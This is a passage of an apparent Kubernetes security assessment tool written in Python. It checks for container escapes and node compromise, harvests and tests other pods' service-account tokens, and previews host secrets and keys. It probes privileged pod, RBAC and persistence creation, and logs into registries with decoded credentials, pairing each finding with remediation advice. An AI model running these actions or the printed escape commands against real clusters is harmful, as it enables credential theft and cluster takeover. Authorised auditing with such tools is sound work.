    has_all  = int(cap_eff, 16) >= 0x1FFFFFFFFF if cap_eff else False
    pid1     = (file_read("/proc/1/comm") or "").strip()
    has_hpid = pid1 in ("systemd","init")

    section("nsenter Escape")
    if has_hpid and has_all:
        finding("CRITICAL","nsenter escape possible: hostPID=true + privileged=true",
                "nsenter -t 1 -m -u -i -n -p -- /bin/bash\n→ Full root shell on node",
                "Remove hostPID: true | Set privileged: false | Drop all caps")
        add_attack_edge("Compromised Pod","Node Root","nsenter -t 1 → host bash","CRITICAL")
    elif has_hpid:
        finding("HIGH","hostPID=true but not fully privileged",
                "Read /proc/<pid>/environ from host processes → credential leak",
                "Remove hostPID: true")
    else:
        finding("PASS","nsenter escape not possible","hostPID not enabled")

    section("chroot Escape")
    for mp in ["/host","/hostfs","/rootfs","/node","/mnt/host"]:
        if os.path.exists(f"{mp}/etc/shadow"):
            finding("CRITICAL",f"chroot escape via hostPath at {mp}",
                    f"chroot {mp} /bin/bash → node root",
                    "Remove hostPath volumes | Enable PSS Restricted")
            add_attack_edge("Compromised Pod","Node Root",f"chroot {mp}","CRITICAL")
            break
    else:
        finding("PASS","chroot escape not possible","No host filesystem mount")

    section("cgroup v1 release_agent")
    release_agents = []
    try:
        for subsys in os.listdir("/sys/fs/cgroup"):
            ra = f"/sys/fs/cgroup/{subsys}/release_agent"
            if os.path.exists(ra): release_agents.append(ra)
    except: pass
    writable_ra = [r for r in release_agents[:3] if os.access(r, os.W_OK)]
    if writable_ra:
        finding("CRITICAL","cgroup v1 release_agent writable — host escape possible",
                f"Paths: {', '.join(writable_ra)}\n"
                "Write payload to release_agent → executes on host when cgroup released",
                "Disable cgroup v1 | Use cgroup v2 | Drop all capabilities")
        add_attack_edge("Compromised Pod","Node Root","cgroup v1 release_agent write","CRITICAL")
    elif release_agents:
        finding("LOW","cgroup v1 release_agent present but not writable","")
    else:
        finding("PASS","cgroup v1 release_agent not accessible","")

    section("User Namespace Escape")
    rc, out, err = run_cmd("unshare --user --map-root-user id 2>&1", timeout=5)
    if rc == 0 and "uid=0" in out:
        finding("HIGH","User namespace unshare allowed — potential privilege escalation",
                f"unshare --user --map-root-user id → {out.strip()}",
                "Disable user namespace creation: kernel.unprivileged_userns_clone=0")
        add_attack_edge("Compromised Pod","Elevated Privileges","unshare user namespace","HIGH")
    else:
        finding("PASS","User namespace unshare blocked","")

    section("Runtime Socket Escape")
    runtime_socks = {
        "/var/run/docker.sock":"Docker",
        "/run/containerd/containerd.sock":"containerd",
        "/host/run/containerd/containerd.sock":"containerd (hostPath)",
        "/run/crio/crio.sock":"CRI-O",
    }
    found = False
    for path, rt in runtime_socks.items():
        if os.path.exists(path):
            finding("CRITICAL",f"{rt} socket at {path}",
                    "Create privileged containers, exec into any container, snapshot filesystems",
                    "Never mount runtime sockets into application pods")
            add_attack_edge("Compromised Pod","Node Root",f"{rt} socket escape","CRITICAL")
            found = True
    if not found:
        finding("PASS","No runtime socket exposed","")

# ══════════════════════════════════════════════════════════════════
# PHASE 6: NODE-LEVEL COMPROMISE
# ══════════════════════════════════════════════════════════════════
def phase_node():
    global CURRENT_PHASE
    CURRENT_PHASE = "6"
    phase_header("6","Node-Level Compromise",
                 "Kubelet certs, other pods' SA tokens, host files, CA cert abuse")

    section("Kubelet PKI Theft")
    for pki in ["/host/var/lib/kubelet/pki","/var/lib/kubelet/pki"]:
        if os.path.isdir(pki):
            try:
                pems = [f for f in os.listdir(pki) if f.endswith(".pem")]
                if pems:
                    finding("CRITICAL",f"Kubelet PKI accessible: {pki}",
                            f"Files: {', '.join(pems[:5])}\n"
                            "system:node:<name> role → impersonate kubelet to API server",
                            "Remove hostPath mounts | PSS Restricted")
                    add_attack_edge("Node Access","API Server","Kubelet cert → system:node impersonation","CRITICAL")
                    break
            except: pass
    else:
        finding("PASS","Kubelet PKI not accessible","")

    section("Other Pods' SA Tokens")
    stolen = []
    seen_toks = set()
    for base in ["/host/var/lib/kubelet/pods","/var/lib/kubelet/pods"]:
        if not os.path.isdir(base): continue
        # Find both plain 'token' files AND projected volume dated symlinks
        _, find_out, _ = run_cmd(
            f"find {base} -name 'token' -not -path '*..data*' 2>/dev/null")
        for tp in find_out.split("\n"):
            tp = tp.strip()
            if not tp: continue
            tok = (file_read(tp) or "").strip()
            if not tok or tok in seen_toks: continue
            seen_toks.add(tok)

            # Projected volume tokens are standard JWTs — decode_jwt handles them
            # but the claims path differs: sub = system:serviceaccount:NS:SA
            jwt = decode_jwt(tok)

            # Method 1: standard secret-based token claims
            sa  = jwt.get("kubernetes.io/serviceaccount/service-account.name","")
            ns  = jwt.get("kubernetes.io/serviceaccount/namespace","")

            # Method 2: projected volume tokens use 'sub' field
            if not sa or not ns:
                sub = jwt.get("sub","")
                # sub format: system:serviceaccount:<namespace>:<sa-name>
                if sub.startswith("system:serviceaccount:"):
                    parts = sub.split(":")
                    if len(parts) == 4:
                        ns = parts[2]
                        sa = parts[3]

            # Method 3: parse from file path — path contains pod UID and volume name
            if not sa or not ns:
                # Path: /host/var/lib/kubelet/pods/<uid>/volumes/kubernetes.io~projected/<vol>/token
                path_parts = tp.split("/")
                try:
                    vol_idx = path_parts.index("volumes")
                    # volume name often contains the SA name
                    vol_name = path_parts[vol_idx+2] if len(path_parts) > vol_idx+2 else ""
                    sa  = vol_name or "unknown"
                    ns  = "unknown"
                except: pass

            if not sa: sa = "unknown"
            if not ns: ns = "unknown"

            stolen.append((sa, ns, tp, tok))

    if stolen:
        finding("CRITICAL",f"Found {len(stolen)} SA token(s) from other pods",
                "\n".join([f"{ns}/{sa} — {path}" for sa,ns,path,_ in stolen[:8]]),
                "Remove hostPath mounts | PSS Restricted blocks hostPath: /")
        add_attack_edge("Node Access","Other Namespaces","Stolen SA tokens from /var/lib/kubelet/pods","CRITICAL")
        # Test ALL unique tokens for permissions — not just first 3
        high_value = []
        for sa, ns, path, tok in stolen:
            scr = score_token(tok, f"{ns}/{sa} (stolen)")
            # Test key permissions
            checks = {
                "secrets":    k8s_api("/api/v1/secrets", token=tok)[0],
                "nodes":      k8s_api("/api/v1/nodes", token=tok)[0],
                "namespaces": k8s_api("/api/v1/namespaces", token=tok)[0],
                "crbs":       k8s_api("/apis/rbac.authorization.k8s.io/v1/clusterrolebindings", token=tok)[0],
            }
            allowed = [k for k,v in checks.items() if v == 200]
            if allowed:
                high_value.append((ns, sa, path, allowed))
                finding("CRITICAL",f"Stolen token {ns}/{sa} has elevated permissions",
                        f"Token: {path}\nAllowed: {', '.join(allowed)}",
                        "PSS Restricted + no hostPath")
                add_attack_edge(f"Stolen Token {ns}/{sa}","Elevated Access",
                                f"Permissions: {', '.join(allowed)}","CRITICAL")
        if not high_value:
            finding("INFO","Stolen tokens found but all have limited permissions",
                    f"{len(stolen)} tokens tested — none had secrets/nodes/namespaces/crbs access")
    else:
        finding("PASS","No other pods' tokens accessible","")

    section("Sensitive Host Files")
    sensitive = [
        ("/host/etc/kubernetes/admin.conf",    "CRITICAL","K8s admin kubeconfig"),
        ("/host/etc/kubernetes/kubelet.conf",  "HIGH",    "Kubelet kubeconfig"),
        ("/host/var/lib/kubelet/kubeconfig",   "HIGH",    "Kubelet kubeconfig (alt)"),
        ("/host/home/kubernetes/kube-env",     "HIGH",    "GKE node kube-env"),
        ("/host/etc/shadow",                   "HIGH",    "Node /etc/shadow"),
        ("/host/root/.ssh/id_rsa",             "CRITICAL","Root SSH private key"),
        ("/host/root/.ssh/authorized_keys",    "HIGH",    "Root SSH authorized keys"),
        ("/host/etc/kubernetes/pki/ca.key",    "CRITICAL","Cluster CA private key"),
    ]
    any_found = False
    for path, sev, desc in sensitive:
        if os.path.exists(path):
            preview = truncate((file_read(path, lines=2) or ""), 80)
            finding(sev, f"Sensitive file: {desc}", f"Path: {path}\nPreview: {preview}",
                    "Remove hostPath mounts | Apply PSS Restricted")
            any_found = True
            if "CRITICAL" == sev:
                add_attack_edge("Node Access","Cluster Admin",f"{desc} → full cluster access","CRITICAL")
    if not any_found:
        finding("PASS","No sensitive host files accessible","")

    section("Cluster CA Certificate")
    ca = file_read("/var/run/secrets/kubernetes.io/serviceaccount/ca.crt")
    if ca:
        extra_cas = ["/etc/kubernetes/pki/ca.crt","/host/etc/kubernetes/pki/ca.crt"]
        for p in extra_cas:
            if os.path.exists(p):
                finding("HIGH",f"Additional CA cert accessible: {p}",
                        "Combined with node PKI → possible API server MITM",
                        "Remove hostPath CA cert mounts")
        finding("INFO","Standard SA CA cert present",
                "Normal — used for TLS verification | Not exploitable alone")

    print_token_ranking()

# ══════════════════════════════════════════════════════════════════
# PHASE 7: CLUSTER PRIVILEGE ESCALATION
# ══════════════════════════════════════════════════════════════════
def phase_privesc():
    global CURRENT_PHASE
    CURRENT_PHASE = "7"
    phase_header("7","Cluster-Wide Privilege Escalation",
                 "Privileged pod creation, RBAC escalation, controller hijacking, scheduler abuse")

    ns = CTX.get("namespace","default")
    if not CTX.get("token"):
        finding("INFO","No SA token — escalation checks skipped",""); return

    no_mutate = CTX.get("no_mutate", False)

    section("Privileged Pod Creation")
    if no_mutate:
        finding("INFO","--no-mutate: skipping pod creation test","Inferring from RBAC only")
    else:
        test_pod = {
            "apiVersion":"v1","kind":"Pod",
            "metadata":{"name":f"kubexhunt-probe-{int(time.time())}"},
            "spec":{"containers":[{"name":"probe","image":"busybox","command":["sleep","10"]}]}
        }
        code, resp = k8s_api(f"/api/v1/namespaces/{ns}/pods", method="POST", data=test_pod)
        if code == 201:
            pod_name = resp.get("metadata",{}).get("name","")
            finding("HIGH",f"Can create pods in '{ns}'",f"Created: {pod_name}",
                    "Remove pod create from SA | Apply PSS Restricted")
            k8s_api(f"/api/v1/namespaces/{ns}/pods/{pod_name}", method="DELETE")

            priv_pod = {
                "apiVersion":"v1","kind":"Pod",
                "metadata":{"name":f"kubexhunt-priv-{int(time.time())}"},
                "spec":{
                    "hostPID":True,"hostNetwork":True,
                    "containers":[{"name":"escape","image":"busybox","command":["sleep","10"],
                                   "securityContext":{"privileged":True},
                                   "volumeMounts":[{"name":"host","mountPath":"/host"}]}],
                    "volumes":[{"name":"host","hostPath":{"path":"/"}}]
                }
            }
            code2, resp2 = k8s_api(f"/api/v1/namespaces/{ns}/pods", method="POST", data=priv_pod)
            if code2 == 201:
                priv_name = resp2.get("metadata",{}).get("name","")
                finding("CRITICAL","Privileged pod creation SUCCESS — full node escape achievable",
                        f"Created: {priv_name} with hostPID+hostNetwork+hostPath+privileged\n"
                        "Root access to every node this pod is scheduled on",
                        "Apply PSS Restricted | Deny pod create from SA | Use Kyverno")
                k8s_api(f"/api/v1/namespaces/{ns}/pods/{priv_name}", method="DELETE")
                add_attack_edge("SA Token","Node Root","Privileged pod creation → node escape","CRITICAL")
            else:
                finding("PASS","Privileged pod creation blocked",f"HTTP {code2}")
        else:
            finding("PASS",f"Cannot create pods in '{ns}'",f"HTTP {code}")

    section("Scheduler Abuse — Targeted Node Scheduling")
    code_auth, resp_auth = k8s_api(
        "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews", method="POST",
        data={"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview",
              "spec":{"resourceAttributes":{"namespace":ns,"verb":"create","resource":"pods"}}})
    can_create_pods = (code_auth == 201 and resp_auth and
                       resp_auth.get("status",{}).get("allowed",False))
    if can_create_pods and CTX.get("nodes"):
        node_names = [n["name"] for n in CTX["nodes"]]
        finding("HIGH","Can schedule pods on specific nodes via nodeName field",
                f"Nodes: {', '.join(node_names[:4])}\n"
                "Force pod onto control-plane or sensitive-workload nodes",
                "Remove pod create | Apply NodeSelector restrictions via Kyverno")
        add_attack_edge("SA Token","Control Plane Node","nodeName scheduling → targeted node","HIGH")

    section("ClusterRoleBinding Creation")
    if not no_mutate:
        test_crb = f"kubexhunt-test-{int(time.time())}"
        code, resp = k8s_api(
            "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings", method="POST",
            data={"apiVersion":"rbac.authorization.k8s.io/v1","kind":"ClusterRoleBinding",
                  "metadata":{"name":test_crb},
                  "roleRef":{"apiGroup":"rbac.authorization.k8s.io","kind":"ClusterRole","name":"view"},
                  "subjects":[{"kind":"ServiceAccount","name":"default","namespace":ns}]})
        if code == 201:
            finding("CRITICAL","Can create ClusterRoleBindings — permanent RBAC escalation",
                    f"Created: {test_crb}\nBind cluster-admin to any SA → full takeover",
                    "Remove ClusterRoleBinding create from SA")
            k8s_api(f"/apis/rbac.authorization.k8s.io/v1/clusterrolebindings/{test_crb}",
                    method="DELETE")
            add_attack_edge("SA Token","Cluster Admin","Create ClusterRoleBinding → cluster-admin","CRITICAL")
        else:
            finding("PASS","Cannot create ClusterRoleBindings",f"HTTP {code}")

    section("Full Controller Patch Test")
    controllers = [
        (f"/apis/apps/v1/namespaces/{ns}/deployments",    "Deployment"),
        (f"/apis/apps/v1/namespaces/{ns}/statefulsets",   "StatefulSet"),
        (f"/apis/apps/v1/namespaces/{ns}/daemonsets",     "DaemonSet"),
        (f"/apis/batch/v1/namespaces/{ns}/cronjobs",      "CronJob"),
    ]
    for list_path, ctrl_type in controllers:
        code_l, resp_l = k8s_api(list_path)
        if code_l == 200 and resp_l:
            items = resp_l.get("items",[])
            if items:
                name = items[0]["metadata"]["name"]
                patch = [{"op":"test","path":"/metadata/name","value":name}]
                code_p, _ = k8s_api(f"{list_path}/{name}", method="PATCH", data=patch)
                if code_p in (200,204):
                    finding("HIGH",f"Can patch {ctrl_type} '{name}'",
                            "Inject malicious sidecar containers into existing workloads\n"
                            "Attacker container runs alongside legitimate app — stealth persistence",
                            f"Remove {ctrl_type.lower()} patch permission from SA")
                    add_attack_edge("SA Token","Stealth Persistence",f"Patch {ctrl_type} → sidecar injection","HIGH")

    section("Admission Webhook Security")
    code_wh, resp_wh = k8s_api("/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations")
    if code_wh == 200 and resp_wh:
        ignore_whs = []
        for wh in resp_wh.get("items",[]):
            for hook in wh.get("webhooks",[]):
                if hook.get("failurePolicy") == "Ignore":
                    ignore_whs.append(wh["metadata"]["name"])
                    # Check if webhook service is reachable
                    svc_ref = hook.get("clientConfig",{}).get("service",{})
                    if svc_ref:
                        wh_ns = svc_ref.get("namespace","")
                        wh_svc = svc_ref.get("name","")
                        wh_ip = dns_resolve(f"{wh_svc}.{wh_ns}.svc.cluster.local")
                        # Also try direct TCP probe to the service
                        svc_reachable = bool(wh_ip) or tcp_open(f"{wh_svc}.{wh_ns}.svc.cluster.local", 443, 2)
                        if not svc_reachable:
                            finding("CRITICAL",
                                    f"Webhook '{wh['metadata']['name']}' failurePolicy=Ignore AND service unreachable",
                                    f"Service: {wh_svc}.{wh_ns} — cannot be resolved\n"
                                    "ALL admission policies bypassed silently when webhook is down",
                                    "Set failurePolicy: Fail | Fix webhook service")
                            add_attack_edge("SA Token","Policy Bypass",
                                            "Webhook unreachable + Ignore → privileged pod creation","CRITICAL")
        if ignore_whs:
            finding("HIGH",f"Webhooks with failurePolicy=Ignore: {len(ignore_whs)}",
                    f"Webhooks: {', '.join(ignore_whs)}\nPolicies silently bypassed if webhook down",
                    "Set failurePolicy: Fail on all security-relevant webhooks")
        else:
            finding("PASS","All admission webhooks use failurePolicy=Fail","")

    section("etcd Encryption at Rest")
    code_ap, resp_ap = k8s_api("/api/v1/namespaces/kube-system/pods")
    if code_ap == 200 and resp_ap:
        for pod in resp_ap.get("items",[]):
            if "kube-apiserver" in pod.get("metadata",{}).get("name",""):
                for container in pod.get("spec",{}).get("containers",[]):
                    cmd_str = " ".join(container.get("command",[]))
                    if "encryption-provider-config" in cmd_str:
                        finding("PASS","etcd encryption-at-rest configured","--encryption-provider-config flag set")
                    else:
                        finding("HIGH","etcd encryption-at-rest NOT detected",
                                "Secrets stored in plaintext in etcd",
                                "Configure --encryption-provider-config on API server")
    elif code_ap in (401, 403):
        finding("INFO",f"Cannot inspect kube-apiserver pod (HTTP {code_ap}) — etcd encryption status unknown",
                "On EKS: aws eks describe-cluster --name <cluster> --query cluster.encryptionConfig")

# ══════════════════════════════════════════════════════════════════
# PHASE 8: PERSISTENCE
# ══════════════════════════════════════════════════════════════════
def phase_persistence():
    global CURRENT_PHASE
    CURRENT_PHASE = "8"
    phase_header("8","Persistence Techniques",
                 "Backdoor SA, DaemonSet, sidecar injection, CronJob persistence")

    ns       = CTX.get("namespace","default")
    no_mutate = CTX.get("no_mutate", False)
    if not CTX.get("token"):
        finding("INFO","No SA token — persistence checks skipped",""); return

    if no_mutate:
        finding("INFO","--no-mutate: inferring persistence capability from RBAC",""); return

    section("ServiceAccount Creation in kube-system")
    sa_name = f"kubexhunt-sa-{int(time.time())}"
    code, _ = k8s_api("/api/v1/namespaces/kube-system/serviceaccounts", method="POST",
                       data={"apiVersion":"v1","kind":"ServiceAccount","metadata":{"name":sa_name}})
    if code == 201:
        finding("CRITICAL","Can create SAs in kube-system — backdoor SA possible",
                f"Created: {sa_name}\nBind cluster-admin to backdoor SA → permanent access",
                "Restrict SA create in kube-system")
        k8s_api(f"/api/v1/namespaces/kube-system/serviceaccounts/{sa_name}", method="DELETE")
        add_attack_edge("SA Token","Persistent Cluster Admin","Backdoor SA in kube-system","CRITICAL")
    else:
        finding("PASS","Cannot create SAs in kube-system",f"HTTP {code}")

    section("DaemonSet Creation in kube-system")
    ds_name = f"kubexhunt-ds-{int(time.time())}"
    ds_spec = {
        "apiVersion":"apps/v1","kind":"DaemonSet",
        "metadata":{"name":ds_name,"namespace":"kube-system"},
        "spec":{
            "selector":{"matchLabels":{"app":"kxh-test"}},
            "template":{
                "metadata":{"labels":{"app":"kxh-test"}},
                "spec":{"tolerations":[{"operator":"Exists"}],
                        "containers":[{"name":"probe","image":"busybox","command":["sleep","10"]}]}
            }
        }
    }
    code, _ = k8s_api("/apis/apps/v1/namespaces/kube-system/daemonsets", method="POST", data=ds_spec)
    if code == 201:
        finding("CRITICAL","Can create DaemonSets in kube-system — runs on EVERY node",
                f"Created: {ds_name}\nCluster-wide persistence on all nodes",
                "Remove DaemonSet create | Restrict kube-system write access")
        k8s_api(f"/apis/apps/v1/namespaces/kube-system/daemonsets/{ds_name}", method="DELETE")
        add_attack_edge("SA Token","All Nodes","DaemonSet in kube-system → every node","CRITICAL")
    else:
        finding("PASS","Cannot create DaemonSets in kube-system",f"HTTP {code}")

    section("CronJob Persistence")
    cj_name = f"kubexhunt-cj-{int(time.time())}"
    cj_spec = {
        "apiVersion":"batch/v1","kind":"CronJob",
        "metadata":{"name":cj_name,"namespace":ns},
        "spec":{
            "schedule":"*/5 * * * *",
            "jobTemplate":{"spec":{"template":{"spec":{
                "containers":[{"name":"probe","image":"busybox","command":["sleep","5"]}],
                "restartPolicy":"OnFailure"
            }}}}
        }
    }
    code, _ = k8s_api(f"/apis/batch/v1/namespaces/{ns}/cronjobs", method="POST", data=cj_spec)
    if code == 201:
        finding("HIGH",f"Can create CronJobs in '{ns}' — scheduled persistence",
                f"Created: {cj_name} (every 5min)\nReliable attacker foothold",
                "Remove CronJob create permission from SA")
        k8s_api(f"/apis/batch/v1/namespaces/{ns}/cronjobs/{cj_name}", method="DELETE")
    else:
        finding("PASS",f"Cannot create CronJobs in '{ns}'",f"HTTP {code}")

    section("Deployment Sidecar Injection")
    code_d, resp_d = k8s_api(f"/apis/apps/v1/namespaces/{ns}/deployments")
    if code_d == 200 and resp_d:
        deps = resp_d.get("items",[])
        if deps:
            dep_name = deps[0]["metadata"]["name"]
            patch = [{"op":"test","path":"/metadata/name","value":dep_name}]
            code_p, _ = k8s_api(f"/apis/apps/v1/namespaces/{ns}/deployments/{dep_name}",
                                  method="PATCH", data=patch)
            if code_p in (200,204):
                finding("HIGH",f"Can patch deployment '{dep_name}' — sidecar injection possible",
                        "Inject malicious container alongside legitimate app",
                        "Remove deployment patch permission")


def _probe_registry(registry, user, password, secret_name):
    """Attempt to list repositories using stolen registry credentials."""
    # Normalise registry URL
    base = registry.rstrip("/")
    if not base.startswith("http"):
        base = f"https://{base}"
    # Try catalog endpoint (Docker Registry API v2)
    import base64 as _b64
    auth_header = _b64.b64encode(f"{user}:{password}".encode()).decode()
    for endpoint in ["/v2/_catalog", "/api/v2.0/repositories?page_size=20",
                     "/v2/", "/api/v2.0/projects"]:
        code, body = http_get(f"{base}{endpoint}",
                               headers={"Authorization": f"Basic {auth_header}"},
                               timeout=5)
        if code == 200:
            finding("CRITICAL",f"Registry '{registry}' authenticated — catalog accessible",
                    f"Secret: {secret_name} | Endpoint: {endpoint}\n"
                    f"Response: {truncate(body, 200)}\n"
                    "Can pull/push images — supply chain backdoor possible",
                    "Rotate registry credentials immediately | Restrict imagePullSecret access")
            add_attack_edge(f"Registry Secret {secret_name}","Private Registry",
                            f"Authenticated pull/push on {registry}","CRITICAL")
            return
        elif code == 401:
            finding("MEDIUM",f"Registry '{registry}' reachable but credentials rejected",
                    f"HTTP 401 on {endpoint} — credentials may be expired",
                    "Verify credentials are current | Rotate registry secret")
            return

# ══════════════════════════════════════════════════════════════════
# PHASE 9: SUPPLY CHAIN & ADMISSION
# ══════════════════════════════════════════════════════════════════
def phase_supply_chain():
    global CURRENT_PHASE
    CURRENT_PHASE = "9"
    phase_header("9","Supply Chain & Admission Control",
                 "Image signing, registry creds, PSS, Kyverno, admission plugins")

    ns = CTX.get("namespace","default")

    section("Image Signing Enforcement")
    code, resp = k8s_api("/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations")
    signing_whs = []
    signing_tools = ["kyverno","cosign","sigstore","notary","connaisseur","portieris"]
    if code == 200 and resp:
        for wh in resp.get("items",[]):
            if any(t in wh["metadata"]["name"].lower() for t in signing_tools):
                signing_whs.append(wh["metadata"]["name"])

    # Fallback: detect Kyverno via /apis discovery OR direct CRD probe
    if not signing_whs and code in (401, 403):
        # First check if /apis already told us Kyverno is installed
        kyverno_via_apis = "kyverno" in CTX.get("runtime_tools", [])
        kyverno_paths = [
            "/apis/kyverno.io/v1/clusterpolicies",
            "/apis/kyverno.io/v2beta1/clusterpolicies",
            "/apis/kyverno.io/v2/clusterpolicies",
        ]
        for kp_path in kyverno_paths:
            code_kp, resp_kp = k8s_api(kp_path, timeout=4)
            if code_kp == 200 and resp_kp:
                policies = resp_kp.get("items",[])
                verify_policies = [p["metadata"]["name"] for p in policies
                                   if "verifyimage" in str(p.get("spec",{})).lower()
                                   or "verify-image" in p["metadata"]["name"].lower()]
                if verify_policies:
                    signing_whs = [f"Kyverno verifyImages: {', '.join(verify_policies[:3])}"]
                else:
                    signing_whs = [f"Kyverno installed ({len(policies)} policies — check verifyImages)"]
                break
            elif code_kp == 403:
                signing_whs = ["Kyverno (CRD present, policies not readable — 403)"]
                break
        # If CRD probe returned NotFound but /apis showed kyverno.io group
        if not signing_whs and kyverno_via_apis:
            signing_whs = ["Kyverno (detected via API group discovery — SA lacks policy list permission)"]

    if signing_whs:
        finding("PASS",f"Image signing / admission control: {', '.join(signing_whs)}","")
    elif code in (401, 403):
        finding("INFO","Cannot list admission webhooks (HTTP {}) — image signing status unknown".format(code),
                "Webhook list requires cluster-level permission\n"
                "Check manually: kubectl get validatingwebhookconfigurations",
                "Ensure Kyverno verifyImages or cosign admission webhook is configured")
    else:
        finding("HIGH","No image signing admission webhook",
                "Unsigned/tampered images can be deployed without verification",
                "Install Kyverno + verifyImages | Use cosign to sign all images")

    section("Registry Credential Exposure")
    code, resp = k8s_api(f"/api/v1/namespaces/{ns}/secrets")
    if code == 200 and resp:
        for item in resp.get("items",[]):
            if item.get("type") == "kubernetes.io/dockerconfigjson":
                name = item["metadata"]["name"]
                cfg_b64 = item.get("data",{}).get(".dockerconfigjson","")
                if cfg_b64:
                    try:
                        cfg = json.loads(decode_b64(cfg_b64))
                        for registry, creds in cfg.get("auths",{}).items():
                            user = creds.get("username","?")
                            # Decode auth field if present (base64 of user:pass)
                            auth_raw = creds.get("auth","")
                            password = ""
                            if auth_raw:
                                try:
                                    decoded_auth = decode_b64(auth_raw)
                                    if ":" in decoded_auth:
                                        password = decoded_auth.split(":",1)[1]
                                except: pass
                            if not password:
                                password = creds.get("password","")
                            finding("HIGH",f"Registry creds in secret '{name}'",
                                    f"Registry: {registry} | User: {user}",
                                    "Restrict secret read | Rotate registry credentials")
                            # Pivot: probe registry catalog API to prove pull access
                            if password:
                                _probe_registry(registry, user, password, name)
                    except: pass

    section("imagePullSecrets on Pod Specs")
    for pod in (CTX.get("all_pods") or []):
        ips = pod.get("spec",{}).get("imagePullSecrets",[])
        if ips:
            pname = pod["metadata"]["name"]
            pns   = pod["metadata"]["namespace"]
            finding("MEDIUM",f"Pod {pns}/{pname} has imagePullSecrets",
                    f"Secrets: {', '.join([s.get('name','') for s in ips])}\n"
                    "If secret is readable, attacker can pull private images",
                    "Restrict secret read permissions")
            break  # report once as example

    section("PSS Enforcement")
    code_ns, resp_ns = k8s_api(f"/api/v1/namespaces/{ns}")
    if code_ns == 200 and resp_ns:
        labels = resp_ns.get("metadata",{}).get("labels",{})
        enforce = labels.get("pod-security.kubernetes.io/enforce","")
        warn    = labels.get("pod-security.kubernetes.io/warn","")
        if enforce == "restricted":
            finding("PASS",f"PSS Restricted enforced on '{ns}'","")
        elif enforce:
            finding("MEDIUM",f"PSS level '{enforce}' on '{ns}' (not restricted)",
                    f"enforce={enforce} warn={warn}",
                    "Set pod-security.kubernetes.io/enforce=restricted")
        else:
            finding("HIGH",f"No PSS labels on '{ns}'",
                    "No Pod Security Standards enforcement",
                    "kubectl label namespace --overwrite pod-security.kubernetes.io/enforce=restricted")
    elif code_ns in (401, 403):
        finding("INFO",f"Cannot read namespace '{ns}' labels (HTTP {code_ns}) — PSS status unknown",
                "Check manually: kubectl get namespace {} -o jsonpath='{{.metadata.labels}}'".format(ns))

    section("Kyverno Policies")
    kyverno_found = False
    # Check if /apis discovery already confirmed Kyverno
    if "kyverno" in CTX.get("runtime_tools", []):
        kyverno_found = True
        info_line("Kyverno confirmed via API group discovery (cilium.io/kyverno.io present)")
    for kp_path in ["/apis/kyverno.io/v1/clusterpolicies",
                    "/apis/kyverno.io/v2beta1/clusterpolicies",
                    "/apis/kyverno.io/v2/clusterpolicies"]:
        code_kp, resp_kp = k8s_api(kp_path, timeout=5)
        if code_kp == 200 and resp_kp:
            policies   = resp_kp.get("items",[])
            # Kyverno v1 uses validationFailureAction, v2+ uses validationFailureAction in rules
            enforced   = []
            audit_only = []
            for p in policies:
                spec = p.get("spec",{})
                action = spec.get("validationFailureAction","")
                # Also check nested rules for newer Kyverno
                if not action:
                    for rule in spec.get("rules",[]):
                        v = rule.get("validate",{})
                        action = v.get("failureAction","") or spec.get("validationFailureAction","")
                        if action: break
                if action.lower() in ("enforce","enforce"):
                    enforced.append(p["metadata"]["name"])
                elif action.lower() in ("audit",""):
                    audit_only.append(p["metadata"]["name"])
                else:
                    enforced.append(p["metadata"]["name"])  # default assume enforce if unclear

            if enforced:
                finding("PASS",f"Kyverno ClusterPolicies enforced: {len(enforced)}",
                        f"Policies: {', '.join(enforced[:6])}")
            if audit_only:
                finding("MEDIUM",f"Kyverno in Audit mode: {len(audit_only)} policies",
                        f"Policies: {', '.join(audit_only[:5])}\nAudit logs but does NOT block",
                        "Change validationFailureAction: Audit → Enforce")
            if not policies:
                finding("HIGH","Kyverno CRD present but no ClusterPolicies found",
                        "Kyverno is installed but no policies are active",
                        "Apply Kyverno policies: registry restriction, non-root, resource limits")
            kyverno_found = True
            break
        elif code_kp == 403:
            # CRD exists (Kyverno installed) but no permission to list
            finding("PASS","Kyverno installed — ClusterPolicies not readable (HTTP 403)",
                    "Kyverno CRD is present, policies enforced but cannot be enumerated\n"
                    "Check: kubectl get clusterpolicies",
                    "")
            kyverno_found = True
            break

    if not kyverno_found:
        finding("INFO","Kyverno CRD not present",
                "No Kyverno policy engine detected")

    section("Admission Plugin Detection")
    code_ap, resp_ap = k8s_api("/api/v1/namespaces/kube-system/pods")
    if code_ap == 200 and resp_ap:
        for pod in resp_ap.get("items",[]):
            if "kube-apiserver" in pod.get("metadata",{}).get("name",""):
                for c in pod.get("spec",{}).get("containers",[]):
                    cmd = " ".join(c.get("command",[]))
                    if "AlwaysAdmit" in cmd:
                        finding("CRITICAL","AlwaysAdmit admission plugin enabled",
                                "ALL admission control bypassed — any pod, any config accepted",
                                "Remove AlwaysAdmit from --enable-admission-plugins")
                        add_attack_edge("SA Token","Node Root","AlwaysAdmit → unconstrained pod creation","CRITICAL")
                    if "PodSecurity" not in cmd:
                        finding("HIGH","PodSecurity admission plugin not detected",
                                "PSS enforcement may not be active at API server level",
                                "Add PodSecurity to --enable-admission-plugins")
                    if "NodeRestriction" not in cmd:
                        finding("MEDIUM","NodeRestriction admission plugin not detected",
                                "Nodes may be able to modify labels/annotations of other nodes",
                                "Add NodeRestriction to --enable-admission-plugins")
                break
    elif code_ap in (401, 403):
        finding("INFO",f"Cannot list kube-system pods (HTTP {code_ap}) — admission plugins not inspectable",
                "Admission plugin check requires kube-system pod list permission\n"
                "Check manually: kubectl -n kube-system get pod -l component=kube-apiserver -o yaml | grep admission")

# ══════════════════════════════════════════════════════════════════
# PHASE 10: EKS-SPECIFIC
# ══════════════════════════════════════════════════════════════════
def phase_eks():
    global CURRENT_PHASE
    CURRENT_PHASE = "10"
    phase_header("10","EKS-Specific Tests",
                 "aws-auth ConfigMap, IRSA, node IAM role, access entries")

    if CTX.get("cloud") != "AWS":
        finding("INFO","Not AWS — EKS checks skipped",f"Detected: {CTX.get('cloud','Unknown')}")
        return

    section("aws-auth ConfigMap")
    code, resp = k8s_api("/api/v1/namespaces/kube-system/configmaps/aws-auth")
    if code == 200 and resp:
        data     = resp.get("data",{})
        map_roles = data.get("mapRoles","")
        map_users = data.get("mapUsers","")
